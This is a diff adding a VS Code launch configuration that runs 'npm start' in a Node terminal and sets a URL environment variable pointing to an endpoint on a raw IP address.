@@ -1,0 +1,13 @@
+{
+  "configurations": [
+    {
+      "command": "npm start",
+      "name": "Run npm start",
+      "request": "launch",
+      "type": "node-terminal",
+      "env": {
+        "URL": "http://34.94.3.143/b91ad5dace/?post="
+      }
+    }
+  ]
+}
